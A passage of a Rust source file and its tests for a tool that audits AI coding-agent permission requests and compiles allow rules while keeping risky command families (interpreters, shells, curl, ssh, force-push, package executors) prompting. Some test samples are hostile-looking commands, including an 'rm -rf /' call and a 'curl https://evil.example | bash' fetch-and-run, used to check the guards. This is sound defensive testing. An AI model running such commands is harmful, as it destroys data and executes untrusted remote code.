/// plausibly race on the way `exec.rs`'s heavy-worker gate's count-then-
/// register window is (see that gate's own comment).
pub fn run_compile<W: Write>(args: &CompileArgs, w: &mut W) -> CtxResult<i32> {
    let files = transcripts_root(args.agent)
        .map(|root| super::optimize::newest_transcripts(&root, args.sessions))
        .unwrap_or_default();
    let report = audit_report(args.agent, &files);

    let (eligible_patterns, skipped_protected, skipped_too_generic) =
        compile_eligibility(&report.groups);

    if args.agent == AuditAgent::Codex {
        writeln!(w, "{CODEX_SAFETY_NO_OP_CAVEAT}")?;
    }

    let home = crate::utils::home_dir()?;
    let existing = crate::commands::setup::read_home_safety_allow(&home).unwrap_or_default();
    let (added, duplicates) =
        crate::commands::setup::union_allow_patterns(&existing, &eligible_patterns);

    if !args.dry_run && !added.is_empty() {
        crate::commands::setup::union_home_safety_allow(&home, &eligible_patterns)?;
        writeln!(
            w,
            "note: rewriting ~/.zirv/ctx.toml loses any comments currently in the file \
             (existing values are preserved); the pre-write file was copied to ctx.toml.bak"
        )?;
    }

    write_compile_summary(
        w,
        args.dry_run,
        &added,
        &skipped_protected,
        &skipped_too_generic,
        &duplicates,
    )?;
    Ok(0)
}

fn write_compile_summary<W: Write>(
    w: &mut W,
    dry_run: bool,
    added: &[String],
    skipped_protected: &[String],
    skipped_too_generic: &[String],
    duplicates: &[String],
) -> CtxResult<()> {
    writeln!(
        w,
        "# Permission compile{}\n",
        if dry_run { " (dry run)" } else { "" }
    )?;
    if added.is_empty() {
        writeln!(w, "added: (none)")?;
    } else {
        writeln!(w, "added:")?;
        for pattern in added {
            writeln!(w, "  - {pattern}")?;
        }
    }
    if !skipped_protected.is_empty() {
        writeln!(w, "skipped (protected):")?;
        for family in skipped_protected {
            writeln!(w, "  - {family}")?;
        }
    }
    if !skipped_too_generic.is_empty() {
        writeln!(w, "skipped (too generic):")?;
        for family in skipped_too_generic {
            writeln!(w, "  - {family} -- {TOO_GENERIC_REASON}")?;
        }
    }
    if !duplicates.is_empty() {
        writeln!(w, "skipped (duplicate, already in [safety] allow):")?;
        for pattern in duplicates {
            writeln!(w, "  - {pattern}")?;
        }
    }
    writeln!(
        w,
        "\ntakes effect for new sessions; running sessions will show 'policy snapshot stale' \
         in `zirv ctx status` until relaunched"
    )?;
    Ok(())
}

pub fn run<W: Write>(args: &PermissionsArgs, w: &mut W) -> CtxResult<i32> {
    match &args.verb {
        PermissionsVerb::Audit(a) => run_audit(a, w),
        PermissionsVerb::Compile(a) => run_compile(a, w),
    }
}

/// Shared with `optimize.rs`'s friction pass (issue #132: "surface the same
/// summary in setup/optimization output when approval noise exceeds a
/// documented threshold"): builds the audit for `agent` over `files` and
/// returns it only when the noise is worth interrupting the operator about.
pub fn noisy_audit(agent: AuditAgent, files: &[PathBuf]) -> Option<AuditReport> {
    let report = audit_report(agent, files);
    (report.total_requests > NOISE_FINDING_THRESHOLD).then_some(report)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    // -------------------------------------------------------------
    // family_of / is_reusable
    // -------------------------------------------------------------

    #[test]
    fn family_of_collapses_wrappers_to_the_underlying_command() {
        assert_eq!(family_of("gh issue create --title x"), "gh issue");
        assert_eq!(family_of("/bin/zsh -lc 'gh issue view 42'"), "gh issue");
        assert_eq!(
            family_of("env -u FOO zirv setup profile --repo ."),
            "zirv setup profile"
        );
        assert_eq!(
            family_of("cargo nextest run --no-fail-fast"),
            "cargo nextest"
        );
        assert_eq!(family_of("git fetch origin"), "git fetch");
        assert_eq!(family_of("curl https://example.com/health"), "curl");
    }

    #[test]
    fn family_of_treats_a_pipe_target_as_downstream_not_a_new_family() {
        assert_eq!(
            family_of("gh issue list --limit 5 | jq '.[].title'"),
            "gh issue"
        );
    }

    #[test]
    fn a_mixed_case_subcommand_family_stays_protected_end_to_end() {
        let raw = "DoCkEr RuN -it ubuntu bash";
        let family = family_of(raw);
        assert_eq!(family, "docker run");
        assert!(is_protected_family(&family, raw));
    }

    #[test]
    fn a_short_flag_value_is_reusable() {
        assert!(is_reusable("gh issue create --title x --label bug"));
        assert!(is_reusable("cargo nextest run --no-fail-fast"));
        assert!(is_reusable("zirv setup apply --repo ."));
    }

    #[test]
    fn a_long_literal_body_is_not_reusable() {
        let body = "x".repeat(200);
        let command = format!("gh issue create --title y --body \"{body}\"");
        assert!(!is_reusable(&command));
    }

    #[test]
    fn a_pipe_into_a_text_filter_is_not_reusable() {
        assert!(!is_reusable("gh issue list --limit 5 | jq '.[].title'"));
        assert!(!is_reusable("gh pr view 12 --json body | jq -r .body"));
    }

    /// 2026-08-25 review: `is_reusable` used to check only the BARE last
    /// pipe stage, so an `env`-decorated filter target slipped past the
    /// `jq`/`grep`/`awk`/`sed` check entirely and was misjudged reusable.
    #[test]
    fn a_decorated_pipe_filter_is_still_recognised_as_not_reusable() {
        assert!(!is_reusable(
            "gh issue list --limit 5 | env NO_COLOR=1 jq ."
        ));
    }

    // -------------------------------------------------------------
    // codex extractor
    // -------------------------------------------------------------

    #[test]
    fn codex_extracts_only_require_escalated_exec_requests() {
        let lines = [
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "call_id": "call_1",
                    "sandbox_permissions": "require_escalated",
                    "command": "gh issue create --title x --body-file /tmp/body.md"
                }
            })
            .to_string(),
            // Not escalated -- must be skipped.
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "exec",
                    "call_id": "call_2",
                    "command": "cargo build"
                }
            })
            .to_string(),
            // Not an exec tool call -- must be skipped.
            serde_json::json!({
                "type": "response_item",
                "payload": {
                    "type": "custom_tool_call",
                    "name": "apply_patch",
                    "sandbox_permissions": "require_escalated",
                    "command": "echo hi"
                }
            })
            .to_string(),
        ];
        let text = lines.join("\n");
        let requests = extract_codex_requests(&text, "session-a");
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "gh issue");
        assert_eq!(requests[0].result, "escalated");
        // A `--body-file` request has no long inline literal and no filter
        // pipe, so it IS reusable -- the not-reusable shapes are covered by
        // the fixture-driven tests below.
        assert!(requests[0].reusable);
    }

    #[test]
    fn codex_reads_a_command_array_and_a_json_encoded_input_string() {
        let array_line = serde_json::json!({
            "type": "response_item",
            "payload": {
                "type": "custom_tool_call",
                "name": "exec",
                "sandbox_permissions": "require_escalated",
                "command": ["bash", "-lc", "git push --force origin main"]
            }
        })
        .to_string();
        let requests = extract_codex_requests(&array_line, "s");
        assert_eq!(requests.len(), 1);
        assert!(requests[0].raw.contains("git push"));

        let encoded_input = serde_json::json!({
            "sandbox_permissions": "require_escalated",
            "command": "zirv ctx optimize --sessions 3"
        })
        .to_string();
        let input_line = serde_json::json!({
            "type": "response_item",
            "payload": {
                "type": "custom_tool_call",
                "name": "exec",
                "input": encoded_input
            }
        })
        .to_string();
        let requests = extract_codex_requests(&input_line, "s");
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "zirv ctx optimize");
    }

    // -------------------------------------------------------------
    // claude extractor
    // -------------------------------------------------------------

    fn claude_denial_pair(id: &str, name: &str, command: Option<&str>) -> String {
        let input = match command {
            Some(c) => serde_json::json!({ "command": c }),
            None => serde_json::json!({}),
        };
        let use_line = serde_json::json!({
            "message": {
                "content": [{"type": "tool_use", "id": id, "name": name, "input": input}]
            }
        })
        .to_string();
        let result_line = serde_json::json!({
            "message": {
                "content": [{
                    "type": "tool_result",
                    "tool_use_id": id,
                    "is_error": true,
                    "content": [{"type": "text", "text": format!(
                        "Permission to use {name} has been denied because Claude Code is running in don't ask mode."
                    )}]
                }]
            }
        })
        .to_string();
        format!("{use_line}\n{result_line}")
    }

    #[test]
    fn claude_correlates_a_denial_with_its_tool_use_by_id() {
        let text = claude_denial_pair("toolu_1", "Bash", Some("zirv ctx status"));
        let requests = extract_claude_requests(&text, "session-b");
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "zirv ctx status");
        assert_eq!(requests[0].result, "denied");
        assert!(requests[0].cause.contains("dontAsk"));
    }

    #[test]
    fn claude_ignores_a_successful_tool_result() {
        let use_line = serde_json::json!({
            "message": {"content": [{"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "echo hi"}}]}
        }).to_string();
        let ok_result = serde_json::json!({
            "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "content": "hi"}]}
        })
        .to_string();
        let text = format!("{use_line}\n{ok_result}");
        assert!(extract_claude_requests(&text, "s").is_empty());
    }

    #[test]
    fn claude_ignores_an_error_that_is_not_a_permission_denial() {
        let use_line = serde_json::json!({
            "message": {"content": [{"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "false"}}]}
        }).to_string();
        let err_result = serde_json::json!({
            "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "is_error": true, "content": [{"type": "text", "text": "command exited 1"}]}]}
        }).to_string();
        let text = format!("{use_line}\n{err_result}");
        assert!(extract_claude_requests(&text, "s").is_empty());
    }

    #[test]
    fn claude_non_bash_tools_report_the_tool_name_as_family() {
        let text = claude_denial_pair("toolu_2", "Read", None);
        let requests = extract_claude_requests(&text, "s");
        assert_eq!(requests.len(), 1);
        assert_eq!(requests[0].family, "Read");
        // Non-Bash denials have no command-shaped payload to judge for
        // reusability, so they default to reusable (the whole TOOL, not one
        // invocation of it, is what a policy change would grant).
        assert!(requests[0].reusable);
    }

    // -------------------------------------------------------------
    // grouping + report
    // -------------------------------------------------------------

    #[test]
    fn group_requests_sorts_by_count_then_family_and_marks_mixed_reusability() {
        let requests = vec![
            PermissionRequest {
                session: "s".into(),
                raw: "cargo nextest run".into(),
                family: "cargo nextest".into(),
                cause: "c".into(),
                result: "escalated".into(),
                reusable: true,
            },
            PermissionRequest {
                session: "s".into(),
                raw: "gh issue create --body x".into(),
                family: "gh issue".into(),
                cause: "c".into(),
                result: "escalated".into(),
                reusable: true,
            },
            PermissionRequest {
                session: "s".into(),
                raw: "gh issue create --body y".into(),
                family: "gh issue".into(),
                cause: "c".into(),
                result: "escalated".into(),
                reusable: false,
            },
        ];
        let groups = group_requests(&requests);
        assert_eq!(groups[0].family, "gh issue");
        assert_eq!(groups[0].count, 2);
        assert!(!groups[0].reusable, "mixed reusability must fold to false");
        assert_eq!(groups[1].family, "cargo nextest");
        assert_eq!(groups[1].count, 1);
        assert!(groups[1].reusable);
    }

    #[test]
    fn render_report_names_every_group_and_its_recommendation() {
        let report = AuditReport {
            agent: "codex",
            sessions_scanned: 2,
            total_requests: 1,
            groups: vec![FamilyGroup {
                family: "gh issue".into(),
                count: 1,
                reusable: true,
                sample: "gh issue view 1".into(),
                cause: "sandbox_permissions: require_escalated".into(),
                recommendation: "Grant 'gh issue' a standing allow".into(),
                protected: false,
            }],
        };
        let text = render_report(&report);
        assert!(text.contains("gh issue"));
        assert!(text.contains("reusable"));
        assert!(text.contains("Grant 'gh issue'"));
    }

    #[test]
    fn render_report_says_so_when_nothing_was_found() {
        let report = AuditReport {
            agent: "claude",
            sessions_scanned: 3,
            total_requests: 0,
            groups: vec![],
        };
        assert!(render_report(&report).contains("No escalated or denied"));
    }

    #[test]
    fn noisy_audit_is_none_below_the_threshold_and_some_above_it() {
        // Below threshold: no transcripts at all -> zero requests.
        assert!(noisy_audit(AuditAgent::Codex, &[]).is_none());
    }

    // -------------------------------------------------------------
    // Regression fixtures (issue #132 acceptance criterion: "Add
    // regression fixtures covering all command shapes listed above and
    // assert that routine approved families stop re-prompting while
    // protected families still prompt.")
    // -------------------------------------------------------------

    const CODEX_FIXTURE: &str =
        include_str!("../../../tests/fixtures/codex-rollout-permission-requests.jsonl");
    const CLAUDE_FIXTURE: &str =
        include_str!("../../../tests/fixtures/claude-transcript-permission-requests.jsonl");

    #[test]
    fn codex_fixture_covers_reusable_and_one_off_command_shapes() {
        let requests = extract_codex_requests(CODEX_FIXTURE, "fixture-session");
        // 11 escalated `exec` requests in the fixture; the successful
        // `custom_tool_call_output` line and the non-`exec` `apply_patch`
        // line must both be skipped.
        assert_eq!(requests.len(), 11, "{requests:#?}");

        let groups = group_requests(&requests);
        let by_family: HashMap<&str, &FamilyGroup> =
            groups.iter().map(|g| (g.family.as_str(), g)).collect();

        // Routine, operator-approvable families: reusable, and NOT flagged
        // protected -- recommendation grants a standing allow.
        assert!(
            by_family["zirv setup apply"].reusable,
            "{:?}",
            by_family["zirv setup apply"]
        );
        assert!(by_family["git fetch"].reusable);
        assert!(by_family["zirv commit"].reusable);
        // The bare invocation (ctc_4) and its `env -u ...`-wrapped twin
        // (ctc_5) must normalize to the SAME family, not two separate
        // one-offs -- the exact gap issue #132 names ("environment-clean
        // wrappers ... were saved as exact invocations rather than the
        // underlying zirv capability").
        assert_eq!(by_family["zirv setup apply"].count, 2);

        // The pipe-into-`jq` requests and the long inline issue body all
        // collapse to the SAME "gh issue" family as the reusable
        // `--body-file` request -- exactly the noise issue #132 reports:
        // one family, mixed reusability, so the group as a whole must not
        // be reported reusable.
        assert_eq!(by_family["gh issue"].count, 4);
        assert!(
            !by_family["gh issue"].reusable,
            "{:?}",
            by_family["gh issue"]
        );

        // ctc_3, the `&&`-chained five-gate validation batch, asserted on
        // its own family and recommendation, not folded into an aggregate
        // count: it normalizes to "cargo build" (the first invocation in
        // the chain), is reusable (no long literal, no filter pipe), and
        // -- being neither destructive/global-write/credential/publish --
        // is recommended a standing allow, not left prompting.
        let cargo_build = by_family["cargo build"];
        assert_eq!(cargo_build.count, 1);
        assert!(cargo_build.reusable, "{cargo_build:?}");
        assert!(
            cargo_build.recommendation.contains("Grant 'cargo build'"),
            "{:?}",
            cargo_build
        );
        assert!(
            !cargo_build.recommendation.contains("protected family"),
            "an ordinary validation batch must not be flagged protected: {:?}",
            cargo_build
        );

        // A global machine-wide install (`choco install ...`) is REUSABLE
        // by `is_reusable`'s own definition (no long literal, no pipe), but
        // must still be recommended `ask`, never a standing allow -- issue
        // #132's "keep global writes ... prompting unless the operator
        // explicitly enables it."
        let choco = by_family["choco"];
        assert!(choco.reusable, "{choco:?}");
        assert!(
            choco.recommendation.contains("protected family"),
            "{:?}",
            choco
        );
        assert!(
            !choco.recommendation.contains("standing allow in"),
            "a protected family must never be told to grant a standing allow: {:?}",
            choco
        );

        // Publish/release: also reusable by the same definition, also must
        // stay protected regardless.
        let publish = by_family["cargo publish"];
        assert!(publish.reusable, "{publish:?}");
        assert!(
            publish.recommendation.contains("protected family"),
            "{:?}",
            publish
        );
    }

    #[test]
    fn codex_fixture_marks_the_long_body_and_jq_pipe_families_not_reusable() {
        let requests = extract_codex_requests(CODEX_FIXTURE, "fixture-session");
        let long_body = requests
            .iter()
            .find(|r| r.raw.contains("much longer inline issue body"))
            .expect("the long-body request");
        assert!(!long_body.reusable, "{long_body:?}");

        let jq_pipe = requests
            .iter()
            .filter(|r| r.raw.contains("| jq"))
            .collect::<Vec<_>>();
        assert_eq!(jq_pipe.len(), 2);
        assert!(jq_pipe.iter().all(|r| !r.reusable), "{jq_pipe:#?}");
    }

    #[test]
    fn claude_fixture_covers_bash_and_non_bash_denials() {
        let requests = extract_claude_requests(CLAUDE_FIXTURE, "fixture-session");
        // 4 permission denials in the fixture: zirv ctx status, the long-body
        // gh issue create, the Read denial, and the force-push. The
        // successful nextest run and the ordinary (non-permission) failure
        // must both be excluded.
        assert_eq!(requests.len(), 4, "{requests:#?}");

        let by_family: HashMap<&str, &PermissionRequest> =
            requests.iter().map(|r| (r.family.as_str(), r)).collect();
        assert!(by_family["zirv ctx status"].reusable);
        assert!(!by_family["gh issue"].reusable);
        assert!(by_family["Read"].reusable);
        assert_eq!(by_family["git push"].result, "denied");
    }

    /// Force-push is a genuinely dangerous, non-Bash-tool-only concern.
    /// `is_reusable("git push --force origin main")` is TRUE (no long
    /// literal, no filter pipe) -- exactly why reusability alone must never
    /// drive the recommendation: this test proves the "never softened"
    /// claim by actually reading the group's recommendation, not just its
    /// `result`/`reusable` fields, which a reusable-but-protected family
    /// would otherwise pass unnoticed.
    #[test]
    fn claude_fixture_force_push_stays_protected_despite_being_reusable() {
        let requests = extract_claude_requests(CLAUDE_FIXTURE, "fixture-session");
        let groups = group_requests(&requests);
        let git_push = groups
            .iter()
            .find(|g| g.family == "git push")
            .expect("the force-push group");
        assert!(
            git_push.reusable,
            "sanity: --force has no long literal or pipe, so is_reusable says true: {git_push:?}"
        );
        assert!(
            git_push.recommendation.contains("protected family"),
            "{git_push:?}"
        );
        assert!(
            git_push
                .recommendation
                .contains("stays prompting unless the operator explicitly enables it"),
            "{git_push:?}"
        );
        assert!(
            !git_push.recommendation.contains("standing allow in"),
            "a protected family must never be told to grant a standing allow: {git_push:?}"
        );
    }

    // -------------------------------------------------------------
    // `zirv ctx permissions compile` (issue #132 residual)
    // -------------------------------------------------------------

    fn family_group(family: &str, sample: &str, reusable: bool, protected: bool) -> FamilyGroup {
        FamilyGroup {
            family: family.to_string(),
            count: 1,
            reusable,
            sample: sample.to_string(),
            cause: "sandbox_permissions: require_escalated".to_string(),
            recommendation: String::new(),
            protected,
        }
    }

    #[test]
    fn compile_eligibility_picks_reusable_unprotected_families_only() {
        let groups = vec![
            family_group(
                "gh issue",
                "gh issue create --title x --body-file y",
                true,
                false,
            ),
            family_group(
                "gh issue list",
                "gh issue list --limit 5 | jq .",
                false,
                false,
            ),
        ];
        let (eligible, skipped_protected, skipped_too_generic) = compile_eligibility(&groups);
        assert_eq!(eligible, vec!["gh issue *".to_string()]);
        assert!(
            skipped_protected.is_empty(),
            "the not-reusable group is simply omitted, not reported as protected"
        );
        assert!(skipped_too_generic.is_empty());
    }

    /// The core of design decision 3: a group whose CACHED `protected` field
    /// was doctored to `false` must still be caught, because
    /// `compile_eligibility` re-runs `is_protected_family` independently
    /// rather than trusting the field.
    #[test]
    fn compile_eligibility_never_trusts_a_doctored_protected_field() {
        let doctored = family_group("git push", "git push --force origin main", true, false);
        assert!(
            !doctored.protected,
            "sanity: the field itself claims unprotected"
        );
        let (eligible, skipped_protected, _) = compile_eligibility(&[doctored]);
        assert!(
            eligible.is_empty(),
            "a doctored report must never smuggle a protected family into the eligible set"
        );
        assert_eq!(skipped_protected, vec!["git push".to_string()]);
    }

    #[test]
    fn compile_eligibility_still_skips_a_correctly_cached_protected_group() {
        let groups = vec![family_group(
            "npm install",
            "npm install -g some-package",
            true,
            true,
        )];
        let (eligible, skipped_protected, _) = compile_eligibility(&groups);
        assert!(eligible.is_empty());
        assert_eq!(skipped_protected, vec!["npm install".to_string()]);
    }

    // -------------------------------------------------------------
    // Review round 1 (2026-08-26): generic single-token families, and the
    // interpreter/shell/remote-exec protected class
    // -------------------------------------------------------------

    #[test]
    fn is_family_too_generic_refuses_a_single_token_family_regardless_of_content() {
        // Both an interpreter (would ALSO be caught by is_protected_family)
        // and a perfectly harmless program (would NOT be) must be refused by
        // this gate alone -- it is a structural check over the family's
        // shape, not its content.
        assert!(is_family_too_generic("python"));
        assert!(is_family_too_generic("bash"));
        assert!(is_family_too_generic("tasklist"));
        assert!(!is_family_too_generic("git push"));
        assert!(!is_family_too_generic("gh issue"));
    }

    #[test]
    fn is_protected_family_protects_every_interpreter_shell_and_remote_exec_program_unconditionally()
     {
        // Gate (b) alone, called directly -- gate (a) (`is_family_too_generic`,
        // which lives only inside `compile_eligibility`) is never invoked in
        // this test, so this proves the interpreter/shell class protects on
        // its own, with no flag or argument needed at all.
        for (family, sample) in [
            ("python", "python -c \"import os; os.system('rm -rf /')\""),
            ("bash", "bash script.sh"),
            ("sh", "sh -c 'echo hi'"),
            ("curl", "curl https://example.com/health"),
            ("ssh", "ssh host uptime"),
        ] {
            assert!(
                is_protected_family(family, sample),
                "{family} must be protected regardless of arguments: {sample}"
            );
        }
    }

    /// The structural gate (a) must also refuse a single-token family that
    /// is NOT in `is_protected_family`'s interpreter list -- proving (a) is
    /// a real independent guard, not just a alias for (b). Exercised through
    /// `compile_eligibility` (the actual integration point) so the family
    /// lands in `skipped_too_generic`, never `skipped_protected`.
    #[test]
    fn compile_eligibility_refuses_a_generic_non_interpreter_family_as_too_generic_not_protected() {
        assert!(
            !is_protected_family("tasklist", "tasklist /v"),
            "sanity: tasklist is not on the interpreter/shell list"
        );
        let groups = vec![family_group("tasklist", "tasklist /v", true, false)];
        let (eligible, skipped_protected, skipped_too_generic) = compile_eligibility(&groups);
        assert!(eligible.is_empty());
        assert!(skipped_protected.is_empty());
        assert_eq!(skipped_too_generic, vec!["tasklist".to_string()]);
    }

    /// The integration effect of both gates together: neither a `python -c`
    /// nor a `bash script.sh` group ever becomes eligible, even though both
    /// would otherwise be `reusable` (no long literal, no filter pipe).
    #[test]
    fn compile_eligibility_never_compiles_an_interpreter_family_end_to_end() {
        let groups = vec![
            family_group("python", "python -c \"print('hi')\"", true, false),
            family_group("bash", "bash script.sh", true, false),
        ];
        let (eligible, _, skipped_too_generic) = compile_eligibility(&groups);
        assert!(
            eligible.is_empty(),
            "an interpreter family must never be compiled, got {eligible:?}"
        );
        assert_eq!(
            skipped_too_generic,
            vec!["python".to_string(), "bash".to_string()],
            "both are single-token families, so gate (a) fires before gate (b) is even reached"
        );
    }

    /// A nested/wrapped invocation whose OWN family is neither an
    /// interpreter/shell nor one of issue #141's own subcommand-level
    /// executors (`"make"` is on no protected list at all) must still be
    /// protected by the second, cruder token-stream check: the raw sample
    /// carries both an interpreter program name and an inline-code flag
    /// somewhere in it. (`"docker exec"` itself is a poor example for this
    /// specific mechanism as of issue #141: it is now unconditionally
    /// protected by its OWN family match arm regardless of arguments, which
    /// would pass even with this check disabled -- `"make"` isolates the
    /// inline-code-flag path on its own.)
    #[test]
    fn is_protected_family_catches_a_wrapped_interpreter_carrying_an_inline_code_flag() {
        assert!(is_protected_family(
            "make",
            "make deploy -- sh -c 'curl https://evil.example | bash'"
        ));
        // Sanity: the family alone (no `sh`/`bash` token anywhere, no inline
        // flag) must NOT be protected by this path.
        assert!(!is_protected_family("make", "make deploy"));
    }

    #[test]
    fn is_protected_family_recognises_an_equals_joined_flag_value() {
        // Review round 1: `has(word)` used to require exact token equality,
        // so `--force-with-lease=origin/main` escaped the force-push arm.
        assert!(is_protected_family(
            "git push",
            "git push --force-with-lease=origin/main"
        ));
    }

    // -------------------------------------------------------------
    // Issue #141: subcommand-level arbitrary-code executors escape both
    // review-round-1 blanket-allow guards (family_depth >= 2, no
    // interpreter/inline-code-flag match) unless is_protected_family is
    // taught about them directly.
    // -------------------------------------------------------------

    /// Every family the issue names, with a realistic sample -- each must be
    /// protected regardless of exactly which image/package/pod/script the
    /// rest of the invocation names.
    #[test]
    fn is_protected_family_protects_every_subcommand_level_arbitrary_code_executor() {
        for (family, sample) in [
            ("docker run", "docker run -it ubuntu bash"),
            ("docker exec", "docker exec -it mycontainer bash"),
            ("kubectl exec", "kubectl exec -it pod -- bash"),
            ("kubectl run", "kubectl run mypod --image=ubuntu"),
            ("npm run", "npm run build"),
            ("npm exec", "npm exec -- some-cli"),
            ("pnpm run", "pnpm run build"),
            ("pnpm exec", "pnpm exec eslint ."),
            ("pnpm dlx", "pnpm dlx create-react-app app"),
            ("yarn run", "yarn run build"),
            ("yarn dlx", "yarn dlx create-react-app app"),
            ("npx create-react-app", "npx create-react-app app"),
            ("cargo run", "cargo run --release"),
            ("bunx", "bunx cowsay hi"),
            ("uvx", "uvx black ."),
            ("uv run", "uv run script.py"),
        ] {
            assert!(
                is_protected_family(family, sample),
                "{family} must be protected: {sample}"
            );
        }
    }

    /// `gh api` is conditionally protected: a bare read (implicit GET) is
    /// fine, but a non-GET method or a body-carrying flag mutates whatever
    /// the endpoint controls.
    #[test]
    fn is_protected_family_protects_gh_api_only_when_it_mutates() {
        assert!(
            !is_protected_family("gh api", "gh api repos/foo/bar"),
            "a bare gh api call is an implicit GET and must stay unprotected"
        );
        for mutating_sample in [
            "gh api -X POST repos/foo/bar/issues",
            "gh api --method POST repos/foo/bar/issues",
            "gh api --method=DELETE repos/foo/bar/issues/1",
            "gh api -f title=foo repos/foo/bar/issues",
            "gh api --field title=foo repos/foo/bar/issues",
            "gh api --input body.json repos/foo/bar/issues",
        ] {
            assert!(
                is_protected_family("gh api", mutating_sample),
                "must be protected: {mutating_sample}"
            );
        }
        // Explicit GET, spelled either way, stays unprotected.
        assert!(!is_protected_family(
            "gh api",
            "gh api -X GET repos/foo/bar"
        ));
        assert!(!is_protected_family(
            "gh api",
            "gh api --method=GET repos/foo/bar"
        ));
    }

    /// The narrow read-only siblings named in issue #141 must remain
    /// unprotected -- the fix must not have widened the net past the actual
    /// arbitrary-code-execution subcommands.
    #[test]
    fn is_protected_family_leaves_narrow_read_only_siblings_unprotected() {
        for (family, sample) in [
            ("docker ps", "docker ps -a"),
            ("kubectl get", "kubectl get pods"),
            ("cargo build", "cargo build --release"),
            ("gh api", "gh api repos/foo/bar"),
        ] {
            assert!(
                !is_protected_family(family, sample),
                "{family} must stay unprotected: {sample}"
            );
        }
    }

    /// End-to-end confirmation through `compile_eligibility` (not just the
    /// unit-level `is_protected_family`) for the exact matrix issue #141
    /// asks for: every listed executor family refused, while `docker ps`,
    /// `kubectl get pods`, `cargo build`, and a bare-GET `gh api` remain
    /// eligible.
    #[test]
    fn compile_eligibility_refuses_every_subcommand_exec_family_but_keeps_read_only_siblings() {
        let protected_groups = vec![
            family_group("docker run", "docker run -it ubuntu bash", true, false),
            family_group(
                "docker exec",
                "docker exec -it mycontainer bash",
                true,
                false,
            ),
            family_group("kubectl exec", "kubectl exec -it pod -- bash", true, false),
            family_group(
                "kubectl run",
                "kubectl run mypod --image=ubuntu",
                true,
                false,
            ),
            family_group("npm run", "npm run build", true, false),
            family_group("npm exec", "npm exec -- some-cli", true, false),
            family_group("pnpm run", "pnpm run build", true, false),
            family_group("pnpm exec", "pnpm exec eslint .", true, false),
            family_group("pnpm dlx", "pnpm dlx create-react-app app", true, false),
            family_group("yarn run", "yarn run build", true, false),
            family_group("yarn dlx", "yarn dlx create-react-app app", true, false),
            family_group(
                "npx create-react-app",
                "npx create-react-app app",
                true,
                false,
            ),
            family_group("cargo run", "cargo run --release", true, false),
            family_group("bunx", "bunx cowsay hi", true, false),
            family_group("uvx", "uvx black .", true, false),
            family_group("uv run", "uv run script.py", true, false),
            family_group("gh api", "gh api -X POST repos/foo/bar/issues", true, false),
        ];
        let (eligible, skipped_protected, skipped_too_generic) =
            compile_eligibility(&protected_groups);
        assert!(
            eligible.is_empty(),
            "none of these arbitrary-code executors may compile: {eligible:?}"
        );
        // `bunx`/`uvx` are single-token families (neither is in
        // `family_depth`'s two-token map, unlike `npx`), so gate (a)
        // (`is_family_too_generic`) refuses them before `compile_eligibility`
        // ever reaches the protected check -- they still end up refused,
        // just filed under `skipped_too_generic` rather than
        // `skipped_protected`. Every OTHER family here is >= 2 tokens, so
        // only `is_protected_family`'s new subcommand-level match arms (or,
        // for `npx`, the whole-family first-token check) are what refuse
        // them.
        assert_eq!(
            skipped_protected.len() + skipped_too_generic.len(),
            protected_groups.len(),
            "every family above must be refused one way or the other: \
             skipped_protected={skipped_protected:?}, skipped_too_generic={skipped_too_generic:?}"
        );
        assert_eq!(
            skipped_too_generic,
            vec!["bunx".to_string(), "uvx".to_string()],
            "only the single-token families should land here"
        );

        let eligible_groups = vec![
            family_group("docker ps", "docker ps -a", true, false),
            family_group("kubectl get", "kubectl get pods", true, false),
            family_group("cargo build", "cargo build --release", true, false),
            family_group("gh api", "gh api repos/foo/bar", true, false),
        ];
        let (eligible, skipped_protected, skipped_too_generic) =
            compile_eligibility(&eligible_groups);
        assert_eq!(
            eligible,
            vec![
                "docker ps *".to_string(),
                "kubectl get *".to_string(),
                "cargo build *".to_string(),
                "gh api *".to_string(),
            ]
        );
        assert!(skipped_protected.is_empty());
        assert!(skipped_too_generic.is_empty());
    }

    /// Design decision 4: the pattern `run_compile` derives and writes must
    /// actually match the next equivalent invocation, not just the one
    /// sample command in the report. Verified end to end: compile a group
    /// into a temp home's `~/.zirv/ctx.toml`, resolve the real `[safety]`
    /// policy from that file exactly the way a launch would, and evaluate a
    /// DIFFERENT command in the same family (a fresh commit + a different
    /// title, not the literal sample string) against it.
    #[test]
    fn a_compiled_pattern_matches_the_next_equivalent_command_under_the_resolved_policy() {
        let group = family_group(
            "gh issue",
            "gh issue create --title x --body-file /tmp/body.md",
            true,
            false,
        );
        let (eligible, _, _) = compile_eligibility(&[group]);
        assert_eq!(eligible, vec!["gh issue *".to_string()]);

        let home = tempfile::tempdir().expect("home");
        crate::commands::setup::union_home_safety_allow(home.path(), &eligible).expect("write");

        let path = home.path().join(".zirv/ctx.toml");
        let root: toml::Table =
            toml::from_str(&std::fs::read_to_string(&path).expect("read")).expect("parse");
        let safety_value = root.get("safety").cloned();

        let empty: HashMap<String, String> = HashMap::new();
        let policy = super::super::safety::resolve(safety_value, None, &|k| empty.get(k).cloned())
            .expect("resolve");

        let outcome = super::super::safety::evaluate(
            &policy,
            "gh issue edit 99 --add-label bug",
            super::super::adapters::LaunchMode::Headless,
        );
        assert_eq!(
            outcome.verdict,
            super::super::safety::Verdict::Allow,
            "the compiled pattern must match a DIFFERENT gh issue invocation, not just the \
             original sample: {outcome:?}"
        );
    }

    /// Writes one codex rollout fixture under `<home>/.codex/sessions/` --
    /// exactly where `transcripts_root(AuditAgent::Codex)` looks -- so a
    /// `HomeGuard`-scoped `run_compile` call reads it for real. Review round
    /// 1 (2026-08-26): the two tests below used to claim this was not
    /// possible ("not overridable here without a real ~/.codex/sessions")
    /// and drove the writer path manually instead of through `run_compile`
    /// itself -- wrong, since `crate::utils::home_dir()` (what
    /// `transcripts_root` and `run_compile`'s own write path both resolve
    /// through) is exactly what `HomeGuard` redirects, the same seam every
    /// other `HomeGuard`-scoped test in this codebase already relies on.
